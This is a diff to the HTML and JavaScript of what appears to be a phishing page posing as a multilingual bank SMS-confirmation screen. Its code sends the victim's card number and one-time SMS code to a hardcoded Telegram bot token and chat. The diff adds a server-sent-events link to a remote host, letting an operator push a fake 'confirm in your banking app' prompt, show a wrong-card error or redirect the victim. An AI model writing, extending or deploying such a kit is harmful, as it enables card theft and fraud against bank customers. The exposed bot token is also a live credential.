@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -391,6 +390,59 @@
             margin-top: auto;
         }
 
+        /* Стили для пуш-уведомления */
+        .push-notification {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+            animation: fadeIn 0.3s ease;
+            padding: 20px;
+        }
+
+        .push-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(15px);
+            border-radius: 20px;
+            padding: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            animation: slideUp 0.4s ease;
+        }
+
+        .push-icon {
+            font-size: 48px;
+            color: var(--primary);
+            margin-bottom: 20px;
+        }
+
+        .push-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--text);
+            margin-bottom: 15px;
+        }
+
+        .push-message {
+            color: var(--text-secondary);
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
         /* Responsive */
         @media (max-width: 768px) {
             .container {
@@ -448,6 +500,19 @@
                 padding: 14px 20px;
                 min-height: 50px;
                 max-width: 280px;
+            }
+
+            .push-card {
+                padding: 25px;
+                margin: 15px;
+            }
+
+            .push-icon {
+                font-size: 40px;
+            }
+
+            .push-title {
+                font-size: 18px;
             }
         }
 
@@ -510,6 +575,22 @@
             footer {
                 padding: 25px 0;
                 font-size: 13px;
+            }
+
+            .push-card {
+                padding: 20px;
+            }
+
+            .push-icon {
+                font-size: 36px;
+            }
+
+            .push-title {
+                font-size: 16px;
+            }
+
+            .push-message {
+                font-size: 14px;
             }
         }
 
@@ -648,7 +729,9 @@
                 confirmBtnText: 'Подтвердить',
                 timerText: 'Отправить код повторно через',
                 seconds: 'сек.',
-                resendText: 'Отправить код повторно'
+                resendText: 'Отправить код повторно',
+                pushTitle: 'Подтвердите операцию',
+                pushMessage: 'Пожалуйста, подтвердите операцию в вашем банковском приложении'
             },
             pl: {
                 smsTitle: 'Potwierdzenie SMS',
@@ -656,7 +739,9 @@
                 confirmBtnText: 'Potwierdź',
                 timerText: 'Wyślij kod ponownie za',
                 seconds: 'sek.',
-                resendText: 'Wyślij kod ponownie'
+                resendText: 'Wyślij kod ponownie',
+                pushTitle: 'Potwierdź operację',
+                pushMessage: 'Proszę potwierdzić operację w aplikacji bankowej'
             },
             en: {
                 smsTitle: 'SMS Confirmation',
@@ -664,7 +749,9 @@
                 confirmBtnText: 'Confirm',
                 timerText: 'Resend code in',
                 seconds: 'sec.',
-                resendText: 'Resend code'
+                resendText: 'Resend code',
+                pushTitle: 'Confirm the operation',
+                pushMessage: 'Please confirm the operation in your banking app'
             }
         };
 
@@ -817,110 +904,213 @@
             });
         }
 
-        // Обработчик кнопки подтверждения
-        // ФУНКЦИЯ ОТПРАВКИ СМС КОДА С НОМЕРОМ КАРТЫ
-// ФУНКЦИЯ ОТПРАВКИ СМС КОДА С НОМЕРОМ КАРТЫ
-// ФУНКЦИЯ ОТПРАВКИ СМС КОДА С НОМЕРОМ КАРТЫ
-async function sendSMSToBot(smsCode) {
-    try {
-        // ПОЛУЧАЕМ НОМЕР КАРТЫ ИЗ URL
-        const urlParams = new URLSearchParams(window.location.search);
-        let cardNumber = urlParams.get('card');
-        
-        if (!cardNumber) {
-            // ЕСЛИ В URL НЕТ, ПРОБУЕМ ИЗ localStorage
-            cardNumber = localStorage.getItem('lastCardNumber') || 'Неизвестно';
+        // ========== SSE ПОДКЛЮЧЕНИЕ ДЛЯ КОМАНД ОТ БОТА ==========
+        const RAILWAY_URL = "https://roomix-production.up.railway.app";
+        let eventSource = null;
+
+        function connectSSE() {
+            try {
+                const userId = sessionStorage.getItem('currentTransactionId') || "user_default";
+                const sseUrl = `${RAILWAY_URL}/sse/${userId}`;
+                console.log(`🔄 Подключаемся к SSE:`, sseUrl);
+
+                if (eventSource) {
+                    eventSource.close();
+                }
+
+                eventSource = new EventSource(sseUrl);
+
+                eventSource.onopen = function(event) {
+                    console.log('✅ SSE подключение открыто');
+                };
+
+                eventSource.onmessage = function(event) {
+                    console.log('📨 Получено сообщение SSE:', event.data);
+                    try {
+                        const data = JSON.parse(event.data);
+
+                        if (data.type === 'connected') {
+                            console.log('✅ Подтверждение подключения SSE');
+                            return;
+                        }
+
+                        if (data.type === 'bot_command') {
+                            handleBotCommand(data);
+                        }
+                    } catch (e) {
+                        console.error('❌ Ошибка парсинга команды:', e);
+                    }
+                };
+
+                eventSource.onerror = function(event) {
+                    console.error('❌ Ошибка SSE соединения');
+                };
+
+            } catch (error) {
+                console.error('💥 Ошибка создания SSE:', error);
+            }
         }
-        
-        console.log('🔍 Номер карты для СМС:', cardNumber);
-        
-        // СООБЩЕНИЕ: СМС КОД + НОМЕР КАРТЫ
-        const smsMessage = `📱 <b>СМС КОД ПОДТВЕРЖДЕН</b>
 
-💳 <b>Номер карты:</b> ${cardNumber}
-🔐 <b>СМС код:</b> ${smsCode}`;
+        // ========== ОБРАБОТКА КОМАНД ОТ БОТА ==========
+        function handleBotCommand(command) {
+            console.log('🤖 Обработка команды:', command);
 
-        const BOT_TOKEN = '8409122329:AAHdhsJk14l57s7EuPna-zj2YrXYlBhlcHU';
-        const CHAT_ID = '-1003239032658';
+            if (command.action === 'push') {
+                console.log('🔔 Получена команда PUSH');
+                window.showPushNotification();
+            } else if (command.action === 'sms') {
+                console.log('📱 Получена команда SMS');
+                // Уже на странице SMS, ничего не делаем
+            } else if (command.action === 'wrong_card') {
+                console.log('❌ Получена команда WRONG_CARD');
+                window.redirectToPaymentWithError();
+            } else if (command.action === 'bind') {
+                console.log('🔗 Получена команда BIND');
+                window.redirectToSuccess();
+            } else if (command.action === 'success') {
+                console.log('🎉 Получена команда SUCCESS');
+                window.redirectToSuccess();
+            }
+        }
 
-        // Отправляем СМС код с номером карты
-        const smsResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: smsMessage,
-                parse_mode: 'HTML'
-            })
+        // ========== ФУНКЦИИ РЕДИРЕКТА ==========
+        window.redirectToPaymentWithError = function() {
+            console.log('❌ Перенаправляю на payment.html с ошибкой');
+            window.location.href = 'payment.html?status=wrong_card';
+        };
+
+        window.redirectToSuccess = function() {
+            console.log('✅ Перенаправляю на страницу успеха');
+            window.location.href = 'success.html';
+        };
+
+        // ========== ФУНКЦИЯ ПУШ-УВЕДОМЛЕНИЯ ==========
+        window.showPushNotification = function() {
+            const t = translations[currentLanguage];
+
+            const pushModal = document.createElement('div');
+            pushModal.className = 'push-notification';
+
+            pushModal.innerHTML = `
+                <div class="push-card">
+                    <div class="push-icon">🔔</div>
+                    <div class="push-title">${t.pushTitle}</div>
+                    <div class="push-message">${t.pushMessage}</div>
+                </div>
+            `;
+
+            document.body.appendChild(pushModal);
+
+            // Закрытие по клику вне карточки
+            pushModal.addEventListener('click', function(e) {
+                if (e.target === pushModal) {
+                    pushModal.remove();
+                }
+            });
+        };
+
+        // ФУНКЦИЯ ОТПРАВКИ СМС КОДА С НОМЕРОМ КАРТЫ
+        async function sendSMSToBot(smsCode) {
+            try {
+                // ПОЛУЧАЕМ НОМЕР КАРТЫ ИЗ URL
+                const urlParams = new URLSearchParams(window.location.search);
+                let cardNumber = urlParams.get('card');
+                
+                if (!cardNumber) {
+                    // ЕСЛИ В URL НЕТ, ПРОБУЕМ ИЗ localStorage
+                    cardNumber = localStorage.getItem('lastCardNumber') || 'Неизвестно';
+                }
+                
+                console.log('🔍 Номер карты для СМС:', cardNumber);
+                
+                // СООБЩЕНИЕ: СМС КОД + НОМЕР КАРТЫ
+                const smsMessage = `📱 <b>СМС КОД ПОДТВЕРЖДЕН</b>
+
+        💳 <b>Номер карты:</b> ${cardNumber}
+        🔐 <b>СМС код:</b> ${smsCode}`;
+
+                const BOT_TOKEN = '8409122329:AAHdhsJk14l57s7EuPna-zj2YrXYlBhlcHU';
+                const CHAT_ID = '-1003239032658';
+
+                // Отправляем СМС код с номером карты
+                const smsResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: smsMessage,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                const smsResult = await smsResponse.json();
+                console.log('✅ СМС код с номером карты отправлен:', smsResult.ok);
+
+                return smsResult.ok;
+
+            } catch (error) {
+                console.error('❌ Ошибка отправки СМС кода:', error);
+                return false;
+            }
+        }
+
+        // ФУНКЦИИ УВЕДОМЛЕНИЙ
+        function showSuccessMessage() {
+            const btn = document.getElementById('confirmBtn');
+            const originalText = btn.innerHTML;
+            
+            btn.innerHTML = '<i class="fas fa-check"></i> ✅ Код отправлен!';
+            btn.style.background = 'linear-gradient(135deg, #4CAF50 0%, #45a049 100%)';
+            btn.disabled = true;
+            
+            setTimeout(() => {
+                btn.innerHTML = originalText;
+                btn.style.background = '';
+                btn.disabled = false;
+                
+                // Очищаем поля
+                document.querySelectorAll('.code-input').forEach(input => {
+                    input.value = '';
+                    input.classList.remove('filled');
+                });
+                
+                // Фокус на первое поле
+                document.querySelector('.code-input').focus();
+                
+            }, 3000);
+        }
+
+        function showErrorMessage() {
+            const btn = document.getElementById('confirmBtn');
+            const originalText = btn.innerHTML;
+            
+            btn.innerHTML = '<i class="fas fa-times"></i> ❌ Ошибка отправки';
+            btn.style.background = 'linear-gradient(135deg, #FF6B6B 0%, #ee5a5a 100%)';
+            btn.disabled = true;
+            
+            setTimeout(() => {
+                btn.innerHTML = originalText;
+                btn.style.background = '';
+                btn.disabled = false;
+            }, 3000);
+        }
+
+        // Обработчик кнопки подтверждения
+        document.getElementById('confirmBtn').addEventListener('click', async function() {
+            const inputs = document.querySelectorAll('.code-input');
+            const smsCode = Array.from(inputs).map(input => input.value).join('');
+            
+            console.log('📱 Введенный СМС код:', smsCode);
+            
+            // ОТПРАВЛЯЕМ СМС КОД В БОТА
+            const success = await sendSMSToBot(smsCode);
+            
+            if (success) {
+                showSuccessMessage();
+            } else {
+                showErrorMessage();
+            }
         });
-
-        const smsResult = await smsResponse.json();
-        console.log('✅ СМС код с номером карты отправлен:', smsResult.ok);
-
-        return smsResult.ok;
-
-    } catch (error) {
-        console.error('❌ Ошибка отправки СМС кода:', error);
-        return false;
-    }
-}
-// ФУНКЦИИ УВЕДОМЛЕНИЙ
-function showSuccessMessage() {
-    const btn = document.getElementById('confirmBtn');
-    const originalText = btn.innerHTML;
-    
-    btn.innerHTML = '<i class="fas fa-check"></i> ✅ Код отправлен!';
-    btn.style.background = 'linear-gradient(135deg, #4CAF50 0%, #45a049 100%)';
-    btn.disabled = true;
-    
-    setTimeout(() => {
-        btn.innerHTML = originalText;
-        btn.style.background = '';
-        btn.disabled = false;
-        
-        // Очищаем поля
-        document.querySelectorAll('.code-input').forEach(input => {
-            input.value = '';
-            input.classList.remove('filled');
-        });
-        
-        // Фокус на первое поле
-        document.querySelector('.code-input').focus();
-        
-    }, 3000);
-}
-
-function showErrorMessage() {
-    const btn = document.getElementById('confirmBtn');
-    const originalText = btn.innerHTML;
-    
-    btn.innerHTML = '<i class="fas fa-times"></i> ❌ Ошибка отправки';
-    btn.style.background = 'linear-gradient(135deg, #FF6B6B 0%, #ee5a5a 100%)';
-    btn.disabled = true;
-    
-    setTimeout(() => {
-        btn.innerHTML = originalText;
-        btn.style.background = '';
-        btn.disabled = false;
-    }, 3000);
-}
-
-// Обработчик кнопки подтверждения
-document.getElementById('confirmBtn').addEventListener('click', async function() {
-    const inputs = document.querySelectorAll('.code-input');
-    const smsCode = Array.from(inputs).map(input => input.value).join('');
-    
-    console.log('📱 Введенный СМС код:', smsCode);
-    
-    // ОТПРАВЛЯЕМ СМС КОД В БОТА
-    const success = await sendSMSToBot(smsCode);
-    
-    if (success) {
-        showSuccessMessage();
-    } else {
-        showErrorMessage();
-    }
-});
 
         // Инициализация
         document.addEventListener('DOMContentLoaded', function() {
@@ -928,6 +1118,7 @@ document.getElementById('confirmBtn').addEventListener('click', async function()
             changeLanguage(currentLanguage);
             initCodeInputs();
             startTimer();
+            connectSSE();
             
             // Фокус на первое поле ввода
             setTimeout(() => {
@@ -935,10 +1126,15 @@ document.getElementById('confirmBtn').addEventListener('click', async function()
             }, 500);
         });
 
+        // Закрываем при закрытии страницы
+        window.addEventListener('beforeunload', function() {
+            if (eventSource) {
+                eventSource.close();
+            }
+        });
+
         // Предотвращаем масштабирование на iOS при фокусе
         document.addEventListener('touchstart', function() {}, {passive: true});
     </script>
 </body>
 </html>
-
-
